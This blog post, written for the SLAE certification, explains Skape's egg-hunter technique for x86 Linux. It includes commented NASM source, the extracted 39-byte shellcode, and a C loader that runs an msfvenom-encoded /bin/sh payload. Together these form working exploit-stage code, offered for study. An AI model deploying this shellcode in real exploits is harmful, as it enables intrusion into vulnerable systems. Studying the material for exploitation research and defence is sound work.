# SLAE Exam Assignment 3 - Creating an Egg-hunter shellcode

**Reading Time:** _6 minutes_

## Prologue
The third assignment for our SLAE Certification exam is creating an egg-hunter shellcode in such a way so as to make its secondary payload configurable.

Egg-hunter remains an extremely important topic for study by exploitation analysts and rightfully so. 

So without any further ado, let's get down with it!

## So what is an egg-hunter anyway?
Imagine that you have found a buffer overflow exploit in a vulnerable software running in a remote machine but the buffer size or the space controlled by you is not nearly enough to fit a Bind/Reverse TCP shellcode :(

What if I told you there is a way?

Enter the Egg-hunter.

![Eggs](../assets/images/eggs.jpg "Eggs")

As many before me and also the ones who will be attempting this exam after me, there is one paper that stands out of all and is referenced by almost everyone perhaps because of its simplicity and brilliance that is: [Safely Searching Process Virtual Address Space](https://github.com/upayansaha/SLAE-Code-Repository/blob/master/Assignment%203/egghunt-shellcode.pdf) by Skape.

I would recommend all the readers of this blog to read the paper first and then come back here.

I shall not discuss the paper in-depth in this blog-post. However, I shall mention some key concepts required for the analysis and implementation of an egg-hunter payload.
### Egg-hunter payload explained in a sentence
The egg-hunter is a shellcode usually optimized and small in size which is designed to find the final stage larger shellcode marked by an "egg"(4-8 bytes of data) and redirect execution flow to it once it finds it in the virtual address space.
### But how does it work?
The way the egg-hunter works is by iterating through the pages of memory and looking for the "egg" until its found.

Okay okay, I get it but as far as I knew when a program tries to read unallocated memory in Linux, the program will crash throwing a `SIGSEGV` right? So how do you figure that out in advance?

Here comes Skape's out-of-the-box solution. He has devised a way to use the `access()` syscall to check whether a page of memory is accessible or not by using the memory address as the argument and by checking the error-code(_0xf2 OR EFAULT_) returned by the syscall, we can determine whether the page is accessible or not. This enables us to scan the memory safely.

Needless to say, if the page is inaccessible then it should skip to the next page directly otherwise it should continue scanning the memory page looking for our "egg".
### One final note
One last important matter to discuss is what should we consider as this "egg" that we are talking about?

Some implementations of the egg-hunter dictate the condition that the egg itself must be an executable for the egg-hunter to transfer the execution flow to the secondary payload stored somewhere else in memory.

Also, a single instance(4 bytes) of the egg shall be present in the egg-hunter itself so as to enable it to find it in memory by comparison right? Now there might be a scenario where the egg-hunter accidentally finds itself in process's memory thinking it has found the egg when it actually hasn't. So we must keep the egg as something unique.

In light of these issues, Skape has devised an 8-byte executable egg by simply appending the egg to itself making it unique and easily identifiable in the memory. While this is not strictly mandatory but in order to avoid adding unnecessary overheads and complexities, we shall also be using the original "egg" for the purposes of this blog post.

## Egg-hunter Assembly code
Here's the full assembly source of the egg-hunter shellcode:

```nasm
; Filename: egg-hunter_shellcode.nasm
; Author: Upayan a.k.a. slaeryan
; SLAE: 1525
; Contact: upayansaha@icloud.com
; Purpose: This is a x86 Linux null-free egg-hunter shellcode implementing Skape's 
; first technique using access() syscall
; Compile with:
; ./compile.sh egg-hunter_shellcode
; Size of shellcode: 39 bytes


global _start

section .text
_start:

    mov ebx, 0x50905090    ; Moving the 4-byte egg to EBX register
    xor ecx, ecx           ; Clearing ECX register
    mul ecx                ; Clearing EAX

    ; Function to skip to next page
    turn_page:             
    or dx, 0xfff           ; Bitwise OR of current DX value with 0xfff

    ; Function to check whether the following 8 bytes of memory page is accessible or not
    check_page:
    inc edx                ; Increment EDX to make it a multiple of 4096 [PAGE_SIZE]
    pushad                 ; To preserve the current register values in stack
    lea ebx, [edx+0x4]     ; Load the address of the next 8 bytes in EBX to check
    mov al, 0x21           ; Load Syscall value for access() = 0x21 OR 33 in EAX
    int 0x80               ; Executing access() syscall
    cmp al, 0xf2           ; Comparing the return value in AL to 0xf2 == EFAULT
    popad                  ; Restore the register values as we preserved in the stack
    jz turn_page           ; Jump to next page if we got EFAULT otherwise continue

    ; Now that we know the memory is accessible, we will search for our target!
    cmp [edx], ebx         ; Check if we got the egg in [EDX]
    jnz check_page         ; If not zero - Egg not found! Check the next 8 bytes of the page otherwise if zero - we already found the first 4 bytes of the egg
    cmp [edx+0x4], ebx     ; Check the next 4 bytes [EDX+4] to confirm the kill
    jnz check_page         ; If not zero - Egg wasn't found, false-positive! otherwise if zero - mission accomplished - egg found successfully!
    jmp edx                ; Transfer control to the secondary payload
```

There's not much to explain in this source as I have commented in-detail on almost every line of code. Note the optimizations in various parts of the code to minimize the number of instructions as far as possible. 

Also, one important point to note is that the default `PAGE_SIZE` of Linux/x86 is `4kB` or `4096 bytes` which becomes `0x1000` in hex. This would introduce null-characters in our egg-hunter shellcode if we use it which is not exactly desirable. 

As a workaround for this problem, we perform bitwise OR operation on the current `DX` value with `4095` OR `0xfff` and increment `DX` by 1 in `check_page` function in a loop to align the pages properly and make it a multiple of `PAGE_SIZE`. Example: 4096(4095or0xfff=4095 + 1), 8192(4096or0xfff=8191 + 1), 12288(8192or0xfff=12287 + 1) and so on...

This enables us to search through all the memory pages iteratively without skipping any and it's quite a clever trick devised by Skape!

## Egg-hunter shellcode
Let's compile the assembly source with the `compile.sh` script and then subject the ELF32 binary produced to the `converter.py` script to extract the shellcode.

Here's the egg-hunter shellcode:

```
\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2
```

Looks to be null-free and also the size comes as `39 bytes` as described by Skape.

## Staged shellcode loader
Here's the source of the staged shellcode loader which executes the egg-hunter shellcode which in-turn loads the secondary shellcode(currently configured as a MSF execve /bin/sh payload):

```c
// Contact: upayansaha@icloud.com
// Purpose: This loader program has the secondary payload(shellcode) configurable.
// The length of both the payloads are printed and then the egg-hunter payload is 
// executed which in turn loads the secondary payload.
// Note: Don't forget to append the egg(\x90\x50\x90\x50\x90\x50\x90\x50) to the shellcode.
// Compile with:
// g++ -fno-stack-protector -z execstack staged_shellcode_loader.cpp -o staged_shellcode_loader


#include <stdio.h>
#include <string.h>

unsigned char egghunter[] = "\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";

unsigned char shellcode[] = "\x90\x50\x90\x50\x90\x50\x90\x50\xba\xec\xc4\x30\xdf\xdb\xd1\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
                            "\x0b\x31\x56\x15\x83\xee\xfc\x03\x56\x11\xe2\x19\xae\x3b\x87"
                            "\x78\x7d\x5a\x5f\x57\xe1\x2b\x78\xcf\xca\x58\xef\x0f\x7d\xb0"
                            "\x8d\x66\x13\x47\xb2\x2a\x03\x5f\x35\xca\xd3\x4f\x57\xa3\xbd"
                            "\xa0\xe4\x5b\x42\xe8\x59\x12\xa3\xdb\xde"; // CHANGE ME | Gen. using: msfvenom -p linux/x86/exec CMD=/bin/sh --arch x86 -f c -b "\x00"

int main(int argc, char* argv[])
{
    printf("Egg hunter length(Primary payload): %d\n", strlen((const char*)egghunter));
    printf("Shellcode length(Secondary payload): %d\n", strlen((const char*)shellcode)-8);
    int (*ret)() = (int(*)())egghunter;
    ret();
}
```

## A working demo of the egg-hunter shellcode:
Well, all talk and no fun is bad which is why here's a demo of the egg-hunter shellcode which we made just now in action. Enjoy;)

<script id="asciicast-NtBMAHCYIw2BHzcL20bcYSJtS" src="https://asciinema.org/a/NtBMAHCYIw2BHzcL20bcYSJtS.js" async></script>

## Code links:
All the code referred to or used in this project is listed as follows:

1. [The NASM source](https://github.com/slaeryan/SLAE-Code-Repository/blob/master/Assignment%203/egg-hunter_shellcode.nasm)
1. [compile.sh](https://github.com/slaeryan/SLAE-Code-Repository/blob/master/Assignment%203/compile.sh)
1. [converter.py](https://github.com/slaeryan/SLAE-Code-Repository/blob/master/Assignment%203/converter.py)
1. [The Staged Shellcode Loader Program](https://github.com/slaeryan/SLAE-Code-Repository/blob/master/Assignment%203/staged_shellcode_loader)
1. [shellcode_loader.cpp](https://github.com/slaeryan/SLAE-Code-Repository/blob/master/Assignment%203/staged_shellcode_loader.cpp)
1. [Safely Searching Process Virtual Address Space by Skape(PDF)](https://github.com/upayansaha/SLAE-Code-Repository/blob/master/Assignment%203/egghunt-shellcode.pdf)

Feel free to use and modify all of the above code as and when you see fit. 

Cheers!

## Note
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

<br />

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](https://www.pentesteracademy.com/course?id=3)

<br />

Student ID: SLAE-1525
